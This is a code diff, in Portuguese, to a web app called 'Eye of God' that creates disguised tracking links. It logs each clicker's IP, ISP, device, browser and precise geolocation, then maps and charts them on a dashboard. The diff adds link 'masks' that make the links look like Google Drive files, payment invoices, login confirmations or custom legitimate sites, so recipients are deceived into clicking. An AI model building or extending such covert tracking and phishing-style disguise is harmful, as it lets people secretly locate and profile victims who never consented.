+                      <p><strong><i class="fas fa-network-wired"></i> Provedor:</strong> ${trace.ipInfo.isp && trace.ipInfo.isp !== 'Desconhecido' ? trace.ipInfo.isp : 'Informação indisponível'}</p>
+                      ${trace.ipInfo.asn && trace.ipInfo.asn !== 'Desconhecido' ? `<p><strong>ASN:</strong> ${trace.ipInfo.asn}</p>` : ''}
+                      ${trace.ipInfo.currency ? `<p><strong><i class="fas fa-money-bill-wave"></i> Moeda local:</strong> ${trace.ipInfo.currency}</p>` : ''}
+                    </div>
+                    
+                    <div class="trace-details-col">
+                      <p class="device-info">${deviceIcon} <strong>${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)}</strong></p>
+                      <p><strong>${browserIcon} Navegador:</strong> ${browser}</p>
+                      <p><strong>${osIcon} Sistema:</strong> ${os}</p>
+                      <p><strong><i class="fas fa-sign-in-alt"></i> Origem:</strong> ${trace.referer}</p>
+                    </div>
+                  </div>
+                  
+                  ${trace.ipInfo.location && trace.ipInfo.location !== 'Local (Simulado)' && 
+                    trace.ipInfo.location !== 'Desconhecido' && 
+                    trace.ipInfo.location !== 'Localização não identificada' && 
+                    trace.ipInfo.location !== 'Erro na obtenção de dados' ? 
+                    `<div class="map-container" id="map-${index}"></div>` : 
+                    '<div class="no-map-info"><p><i class="fas fa-exclamation-circle"></i> Mapa não disponível para este endereço IP</p></div>'}
+                </div>
+              `;
+            }).join('')
+          }
+          </div>
+        </div>
+        
+        <div class="side-panel">
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title"><i class="fas fa-info-circle"></i> Resumo</h3>
+            </div>
+            <div id="summaryData">
+              <!-- Resumo será gerado via JavaScript -->
+            </div>
+          </div>
+          
+          <div class="card">
+            <div class="card-header">
+              <h3 class="card-title"><i class="fas fa-list-alt"></i> Estatísticas Adicionais</h3>
+            </div>
+            <ul>
+              <li><strong>Acessos por dispositivos móveis:</strong> <span id="mobileStat">0</span></li>
+              <li><strong>Acessos por desktop:</strong> <span id="desktopStat">0</span></li>
+              <li><strong>Taxa de localização precisa:</strong> <span id="preciseLocationRate">0%</span></li>
+              <li><strong>Referências principais:</strong> <span id="topReferrers">-</span></li>
+              <li><strong>Horário com mais acessos:</strong> <span id="peakHour">-</span></li>
+              <li><strong>Data com mais acessos:</strong> <span id="peakDate">-</span></li>
+            </ul>
+          </div>
+        </div>
+      </div>
       
-      <a href="/" class="back-button">Voltar para a página inicial</a>
+      <div class="footer">
+        <p>Eye of God - Sistema de Rastreamento de Mensagens</p>
+        <p>Desenvolvido por @CryptoDevBR</p>
+      </div>
     </div>
-    
-    <script>
-      function copyLink() {
-        const linkInput = document.getElementById('trackingLink');
-        linkInput.select();
-        document.execCommand('copy');
-        alert('Link copiado para a área de transferência!');
-      }
-    </script>
     
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
+      function copyLink(elementId) {
+        const linkInput = document.getElementById(elementId);
+        linkInput.select();
+        document.execCommand('copy');
+        
+        // Feedback visual
+        const btn = linkInput.nextElementSibling;
+        const originalText = btn.textContent;
+        btn.textContent = 'Copiado!';
+        setTimeout(() => {
+          btn.textContent = originalText;
+        }, 2000);
+      }
+      
+      // Funções para tabs
+      document.querySelectorAll('.tab').forEach(tab => {
+        tab.addEventListener('click', () => {
+          // Remover classe active de todas as tabs
+          document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+          // Adicionar classe active na tab clicada
+          tab.classList.add('active');
+          
+          // Esconder todos os conteúdos
+          document.querySelectorAll('.tab-content').forEach(content => {
+            content.classList.remove('active');
+          });
+          
+          // Mostrar o conteúdo correspondente
+          const tabId = tab.getAttribute('data-tab');
+          document.getElementById(tabId).classList.add('active');
+        });
+      });
+      
+      // Função para exportar para PDF
+      function exportToPDF() {
+        // Configurações para o PDF
+        const element = document.getElementById('dashboard');
+        const opt = {
+          margin:       [10, 10, 10, 10],
+          filename:     'eye-of-god-report.pdf',
+          image:        { type: 'jpeg', quality: 0.98 },
+          html2canvas:  { scale: 1 },
+          jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
+        };
+        
+        // Exibir todos os tabs para o PDF
+        document.querySelectorAll('.tab-content').forEach(content => {
+          content.classList.add('active');
+          content.style.display = 'block';
+        });
+        
+        // Criar o PDF
+        html2pdf()
+          .set(opt)
+          .from(element)
+          .save()
+          .then(() => {
+            // Restaurar a visualização original das tabs
+            document.querySelectorAll('.tab-content').forEach(content => {
+              content.classList.remove('active');
+              content.style.display = 'none';
+            });
+            
+            // Reativar apenas a tab atual
+            const activeTab = document.querySelector('.tab.active');
+            if (activeTab) {
+              const tabId = activeTab.getAttribute('data-tab');
+              document.getElementById(tabId).classList.add('active');
+              document.getElementById(tabId).style.display = 'block';
+            }
+          });
+      }
+      
+      // Função para gerar/atualizar o QR Code
+      function generateNewQRCode() {
+        const customization = document.getElementById('qrCodeCustomization');
+        if (customization.style.display === 'none' || customization.style.display === '') {
+          customization.style.display = 'block';
+        } else {
+          customization.style.display = 'none';
+        }
+      }
+      
+      function updateQRCode() {
+        const size = document.getElementById('qrSize').value;
+        const color = document.getElementById('qrColor').value.replace('#', '');
+        const qrCodeContainer = document.getElementById('qrCode');
+        const link = '${req.protocol}://${req.get("host")}/t/${linkId}';
+        
+        const qrImageUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=' + size + '&data=' + encodeURIComponent(link) + '&color=' + color;
+        qrCodeContainer.innerHTML = '<img src="' + qrImageUrl + '" alt="QR Code do link"><p>Escaneie este QR Code para acessar o link</p>';
+      }
+      
+      // Processar dados para os gráficos
       document.addEventListener('DOMContentLoaded', function() {
-        // Inicializar mapas para cada acesso
+        const traces = ${JSON.stringify(traces)};
+        if (traces.length === 0) return;
+        
+        // Preparar dados para os gráficos
+        const deviceData = { mobile: 0, desktop: 0, tablet: 0 };
+        const countryData = {};
+        const browserData = {};
+        const timelineData = {};
+        
+        // Contadores para estatísticas
+        let preciseLocs = 0;
+        const referrers = {};
+        const hourCounts = Array(24).fill(0);
+        const dateCounts = {};
+        
+        // Processar cada trace
+        traces.forEach(trace => {
+          // Analisar user agent para dispositivo e navegador
+          const ua = trace.userAgent;
+          
+          // Dispositivo
+          if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
+            deviceData.mobile++;
+          } else if (ua.includes('iPad') || ua.includes('Tablet')) {
+            deviceData.tablet++;
+          } else {
+            deviceData.desktop++;
+          }
+          
+          // Navegador
+          let browser = 'Outro';
+          if (ua.includes('Firefox')) browser = 'Firefox';
+          else if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
+          else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
+          else if (ua.includes('Edg')) browser = 'Edge';
+          else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';
+          else if (ua.includes('WhatsApp')) browser = 'WhatsApp';
+          
+          browserData[browser] = (browserData[browser] || 0) + 1;
+          
+          // País/Localização
+          let country = 'Desconhecido';
+          if (trace.ipInfo && trace.ipInfo.location) {
+            // Extrair o país da localização
+            const locationParts = trace.ipInfo.location.split(',');
+            if (locationParts.length > 0) {
+              country = locationParts[locationParts.length - 1].trim();
+              if (country === '') {
+                country = locationParts[locationParts.length - 2]?.trim() || 'Desconhecido';
+              }
+            }
+          }
+          
+          countryData[country] = (countryData[country] || 0) + 1;
+          
+          // Localização precisa
+          if (trace.preciseLocation && trace.preciseLocation.latitude) {
+            preciseLocs++;
+          }
+          
+          // Referrer
+          const referer = trace.referer || 'Direto';
+          referrers[referer] = (referrers[referer] || 0) + 1;
+          
+          // Timeline por data
+          const date = new Date(trace.timestamp).toLocaleDateString('pt-BR');
+          timelineData[date] = (timelineData[date] || 0) + 1;
+          dateCounts[date] = (dateCounts[date] || 0) + 1;
+          
+          // Hora do dia
+          const hour = new Date(trace.timestamp).getHours();
+          hourCounts[hour]++;
+        });
+        
+        // Atualizar estatísticas na sidebar
+        document.getElementById('mobileStat').textContent = deviceData.mobile;
+        document.getElementById('desktopStat').textContent = deviceData.desktop;
+        document.getElementById('preciseLocationRate').textContent = Math.round((preciseLocs / traces.length) * 100) + '%';
+        
+        // Top referrers
+        const topReferers = Object.entries(referrers)
+          .sort((a, b) => b[1] - a[1])
+          .slice(0, 2)
+          .map(function(entry) { 
+            return entry[0] + ' (' + entry[1] + ')';
+          })
+          .join(', ');
+        document.getElementById('topReferrers').textContent = topReferers || 'Direto';
+        
+        // Horários e datas com mais acessos
+        const peakHourIndex = hourCounts.indexOf(Math.max(...hourCounts));
+        document.getElementById('peakHour').textContent = peakHourIndex + ':00 - ' + (peakHourIndex+1) + ':00';
+        
+        const peakDate = Object.entries(dateCounts).sort((a, b) => b[1] - a[1])[0];
+        if (peakDate) {
+          document.getElementById('peakDate').textContent = peakDate[0] + ' (' + peakDate[1] + ' acessos)';
+        }
+        
+        // Resumo de dados
+        const summaryContainer = document.getElementById('summaryData');
+        summaryContainer.innerHTML = 
+          '<p>Este link foi acessado <strong>' + traces.length + ' vezes</strong> desde a sua criação em ' + new Date(traces[0].timestamp).toLocaleDateString('pt-BR') + '.</p>' +
+          '<p>O último acesso ocorreu em <strong>' + new Date(traces[traces.length-1].timestamp).toLocaleString('pt-BR') + '</strong>.</p>' +
+          '<p>Porcentagem de usuários que permitiram geolocalização precisa: <strong>' + Math.round((preciseLocs / traces.length) * 100) + '%</strong></p>' +
+          '<p>País com mais acessos: <strong>' + (Object.entries(countryData).sort((a, b) => b[1] - a[1])[0]?.[0] || 'Desconhecido') + '</strong></p>';
+        
+        // Gráfico de dispositivos
+        const deviceCtx = document.getElementById('deviceChart').getContext('2d');
+        new Chart(deviceCtx, {
+          type: 'doughnut',
+          data: {
+            labels: ['Desktop', 'Mobile', 'Tablet'],
+            datasets: [{
+              label: 'Dispositivos',
+              data: [deviceData.desktop, deviceData.mobile, deviceData.tablet],
+              backgroundColor: [
+                'rgba(54, 162, 235, 0.8)',
+                'rgba(75, 192, 192, 0.8)',
+                'rgba(153, 102, 255, 0.8)'
+              ],
+              borderColor: [
+                'rgba(54, 162, 235, 1)',
+                'rgba(75, 192, 192, 1)',
+                'rgba(153, 102, 255, 1)'
+              ],
+              borderWidth: 1
+            }]
+          },
+          options: {
+            responsive: true,
+            plugins: {
+              legend: {
+                position: 'bottom',
+              },
+              title: {
+                display: true,
+                text: 'Distribuição de Dispositivos'
+              }
+            }
+          }
+        });
+        
+        // Gráfico de países
+        const countryLabels = Object.keys(countryData);
+        const countryValues = Object.values(countryData);
+        const countryCtx = document.getElementById('countryChart').getContext('2d');
+        new Chart(countryCtx, {
+          type: 'bar',
+          data: {
+            labels: countryLabels,
+            datasets: [{
+              label: 'Acessos por País',
+              data: countryValues,
+              backgroundColor: 'rgba(75, 192, 192, 0.8)',
+              borderColor: 'rgba(75, 192, 192, 1)',
+              borderWidth: 1
+            }]
+          },
+          options: {
+            responsive: true,
+            scales: {
+              y: {
+                beginAtZero: true,
+                ticks: {
+                  stepSize: 1
+                }
+              }
+            }
+          }
+        });
+        
+        // Gráfico de navegadores
+        const browserLabels = Object.keys(browserData);
+        const browserValues = Object.values(browserData);
+        const browserCtx = document.getElementById('browserChart').getContext('2d');
+        new Chart(browserCtx, {
+          type: 'pie',
+          data: {
+            labels: browserLabels,
+            datasets: [{
+              label: 'Navegadores',
+              data: browserValues,
+              backgroundColor: [
+                'rgba(255, 99, 132, 0.8)',
+                'rgba(54, 162, 235, 0.8)',
+                'rgba(255, 206, 86, 0.8)',
+                'rgba(75, 192, 192, 0.8)',
+                'rgba(153, 102, 255, 0.8)',
+                'rgba(255, 159, 64, 0.8)'
+              ],
+              borderColor: [
+                'rgba(255, 99, 132, 1)',
+                'rgba(54, 162, 235, 1)',
+                'rgba(255, 206, 86, 1)',
+                'rgba(75, 192, 192, 1)',
+                'rgba(153, 102, 255, 1)',
+                'rgba(255, 159, 64, 1)'
+              ],
+              borderWidth: 1
+            }]
+          },
+          options: {
+            responsive: true,
+            plugins: {
+              legend: {
+                position: 'bottom',
+              }
+            }
+          }
+        });
+        
+        // Gráfico de timeline
+        const timelineLabels = Object.keys(timelineData);
+        const timelineValues = Object.values(timelineData);
+        const timelineCtx = document.getElementById('timelineChart').getContext('2d');
+        new Chart(timelineCtx, {
+          type: 'line',
+          data: {
+            labels: timelineLabels,
+            datasets: [{
+              label: 'Acessos por Dia',
+              data: timelineValues,
+              fill: false,
+              backgroundColor: 'rgba(54, 162, 235, 0.8)',
+              borderColor: 'rgba(54, 162, 235, 1)',
+              borderWidth: 2,
+              tension: 0.1
+            }]
+          },
+          options: {
+            responsive: true,
+            scales: {
+              y: {
+                beginAtZero: true,
+                ticks: {
+                  stepSize: 1
+                }
+              }
+            }
+          }
+        });
+        
+        // Inicializar o mapa mundial com todos os pontos de acesso
+        const worldMap = L.map('worldMap').setView([20, 0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'
+        }).addTo(worldMap);
+        
+        // Adicionar marcadores para cada acesso no mapa mundial
+        const markers = [];
+        traces.forEach(trace => {
+          let lat, lng;
+          
+          // Primeiro tentar usar localização precisa (se disponível)
+          if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
+            lat = trace.preciseLocation.latitude;
+            lng = trace.preciseLocation.longitude;
+            
+            const marker = L.marker([lat, lng]).addTo(worldMap);
+            marker.bindPopup(
+              '<strong>Acesso em:</strong> ' + new Date(trace.timestamp).toLocaleString('pt-BR') + '<br>' +
+              '<strong>Localização precisa:</strong> Sim<br>' +
+              '<strong>Precisão:</strong> ±' + Math.round(trace.preciseLocation.accuracy) + ' metros'
+            );
+            markers.push(marker);
+          } 
+          // Caso contrário, usar coordenadas do IP
+          else if (trace.ipInfo && trace.ipInfo.coordinates) {
+            lat = trace.ipInfo.coordinates.latitude;
+            lng = trace.ipInfo.coordinates.longitude;
+            
+            const marker = L.marker([lat, lng]).addTo(worldMap);
+            marker.bindPopup(
+              '<strong>Acesso em:</strong> ' + new Date(trace.timestamp).toLocaleString('pt-BR') + '<br>' +
+              '<strong>IP:</strong> ' + trace.ip + '<br>' +
+              '<strong>Localização:</strong> ' + (trace.ipInfo.location || 'Desconhecido')
+            );
+            markers.push(marker);
+          }
+        });
+        
+        // Se tivermos marcadores, ajustar o mapa para mostrar todos
+        if (markers.length > 0) {
+          const group = new L.featureGroup(markers);
+          worldMap.fitBounds(group.getBounds().pad(0.1));
+        }
+        
+        // Inicializar mapas individuais para cada acesso
         ${traces.map((trace, index) => {
           // Se temos localização precisa do HTML5, usamos ela para o mapa
           if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
@@ -1384,7 +2212,6 @@ app.get('/', (req, res) => {
         padding: 5px 10px;
         border-radius: 3px;
         cursor: pointer;
-        margin-left: 8px;
       }
       .features {
         display: flex;
@@ -1436,6 +2263,20 @@ app.get('/', (req, res) => {
         0% { transform: rotate(0deg); }
         100% { transform: rotate(360deg); }
       }
+      .form-control {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 6px;
+        font-size: 1em;
+        background-color: white;
+        transition: border-color 0.3s, box-shadow 0.3s;
+      }
+      .form-control:focus {
+        border-color: #3498db;
+        box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.25);
+        outline: none;
+      }
     </style>
   </head>
   <body>
@@ -1472,6 +2313,32 @@ app.get('/', (req, res) => {
             <label for="targetUrl">URL de Destino:</label>
             <input type="text" id="targetUrl" name="targetUrl" placeholder="https://exemplo.com" required>
             <small style="color:#666;display:block;margin-top:5px;">Insira a URL para onde seu link deve redirecionar</small>
+          </div>
+          
+          <div class="form-group">
+            <label for="maskStyle">Aparência do Link:</label>
+            <select id="maskStyle" name="maskStyle" class="form-control">
+              <option value="default">Padrão (t/ID)</option>
+              <option value="short">Link curto e discreto (l/abc123)</option>
+              <option value="friendly">Nome amigável (seguro-link-123)</option>
+              <option value="google">Google Drive (drive/document/view/...)</option>
+              <option value="document">Documento compartilhado (docs/shared/...)</option>
+              <option value="photo">Álbum de fotos (photos/album/...)</option>
+              <option value="payment">Pagamento (payment/invoice/...)</option>
+              <option value="login">Confirmação de login (account/login/...)</option>
+              <option value="custom">Máscara personalizada</option>
+            </select>
+            <small style="color:#666;display:block;margin-top:5px;">Escolha como seu link aparecerá para os destinatários</small>
+          </div>
+          
+          <div id="customMaskGroup" class="form-group" style="display:none;">
+            <label for="customMask">Máscara Personalizada:</label>
+            <input type="text" id="customMask" name="customMask" placeholder="www.sitelegitimo.com" class="form-control">
+            <small style="color:#666;display:block;margin-top:5px;">Insira uma URL de máscara personalizada (ex: www.globo.com, facebook.com/perfil, etc)</small>
+            <div class="alert alert-info" style="margin-top:10px;padding:10px;background-color:#e8f4ff;border-left:4px solid #3498db;font-size:0.9em;">
+              <strong>Como funciona:</strong> Quando alguém receber seu link, a URL exibida parecerá ser a que você digitou aqui, 
+              mas ao clicar, eles serão redirecionados através do nosso sistema de rastreamento.
+            </div>
           </div>
           
           <button type="submit">
@@ -1517,60 +2384,6 @@ app.get('/', (req, res) => {
     </div>
     
     <script>
-      document.getElementById('linkForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const targetUrl = document.getElementById('targetUrl').value;
-        const loading = document.getElementById('loading');
-        const result = document.getElementById('result');
-        
-        // Mostrar loading
-        loading.style.display = 'block';
-        result.style.display = 'none';
-        
-        try {
-          const response = await fetch('/api/generate-link', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ targetUrl })
-          });
-          
-          const data = await response.json();
-          
-          if (data.success) {
-            const trackingLink = document.getElementById('trackingLink');
-            const infoLink = document.getElementById('infoLink');
-            const openInfoLink = document.getElementById('openInfoLink');
-            const qrCode = document.getElementById('qrCode');
-            
-            // Preencher os campos
-            trackingLink.value = data.trackingLink;
-            infoLink.value = window.location.origin + '/info/' + data.linkId;
-            openInfoLink.href = '/info/' + data.linkId;
-            
-            // Gerar QR Code
-            qrCode.innerHTML = 
-              '<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + 
-              encodeURIComponent(data.trackingLink) + 
-              '" alt="QR Code do link">' +
-              '<p>Escaneie este QR Code para acessar o link</p>';
-            
-            // Esconder loading e mostrar resultado
-            loading.style.display = 'none';
-            result.style.display = 'block';
-          } else {
-            loading.style.display = 'none';
-            alert('Erro ao gerar link: ' + data.error);
-          }
-        } catch (error) {
-          loading.style.display = 'none';
-          console.error('Erro:', error);
-          alert('Erro ao gerar link. Verifique sua conexão e tente novamente.');
-        }
-      });
-      
       function copyLink(elementId) {
         const linkInput = document.getElementById(elementId);
         linkInput.select();
@@ -1584,6 +2397,101 @@ app.get('/', (req, res) => {
           btn.textContent = originalText;
         }, 2000);
       }
+      
+      // Controlar a exibição do campo de máscara personalizada
+      document.addEventListener('DOMContentLoaded', function() {
+        const maskStyleSelect = document.getElementById('maskStyle');
+        const customMaskGroup = document.getElementById('customMaskGroup');
+        
+        // Função para alternar a visibilidade do campo de máscara personalizada
+        function toggleCustomMaskField() {
+          if (maskStyleSelect.value === 'custom') {
+            customMaskGroup.style.display = 'block';
+          } else {
+            customMaskGroup.style.display = 'none';
+          }
+        }
+        
+        // Verificar estado inicial
+        toggleCustomMaskField();
+        
+        // Ouvir mudanças na seleção
+        maskStyleSelect.addEventListener('change', toggleCustomMaskField);
+        
+        // Formulário de envio
+        document.getElementById('linkForm').addEventListener('submit', function(e) {
+          e.preventDefault();
+          
+          const targetUrl = document.getElementById('targetUrl').value;
+          const maskStyle = document.getElementById('maskStyle').value;
+          let customMask = document.getElementById('customMask').value;
+          const loading = document.getElementById('loading');
+          const result = document.getElementById('result');
+          
+          // Validar máscara personalizada quando o estilo 'custom' estiver selecionado
+          if (maskStyle === 'custom' && !customMask.trim()) {
+            alert('Por favor, insira uma URL de máscara personalizada');
+            return;
+          }
+          
+          // Se não for estilo personalizado, limpar o valor para não enviar desnecessariamente
+          if (maskStyle !== 'custom') {
+            customMask = '';
+          }
+          
+          // Mostrar loading
+          loading.style.display = 'block';
+          result.style.display = 'none';
+          
+          // Fazer a requisição para gerar o link
+          fetch('/api/generate-link', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ 
+              targetUrl: targetUrl,
+              maskStyle: maskStyle,
+              customMask: customMask
+            })
+          })
+          .then(function(response) {
+            return response.json();
+          })
+          .then(function(data) {
+            if (data.success) {
+              const trackingLink = document.getElementById('trackingLink');
+              const infoLink = document.getElementById('infoLink');
+              const openInfoLink = document.getElementById('openInfoLink');
+              const qrCode = document.getElementById('qrCode');
+              
+              // Preencher os campos
+              trackingLink.value = data.trackingLink;
+              infoLink.value = window.location.origin + '/info/' + data.linkId;
+              openInfoLink.href = '/info/' + data.linkId;
+              
+              // Gerar QR Code
+              qrCode.innerHTML = 
+                '<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + 
+                encodeURIComponent(data.trackingLink) + 
+                '" alt="QR Code do link">' +
+                '<p>Escaneie este QR Code para acessar o link</p>';
+              
+              // Esconder loading e mostrar resultado
+              loading.style.display = 'none';
+              result.style.display = 'block';
+            } else {
+              loading.style.display = 'none';
+              alert('Erro ao gerar link: ' + data.error);
+            }
+          })
+          .catch(function(error) {
+            loading.style.display = 'none';
+            console.error('Erro:', error);
+            alert('Erro ao gerar link. Verifique sua conexão e tente novamente.');
+          });
+        });
+      });
     </script>
   </body>
   </html>
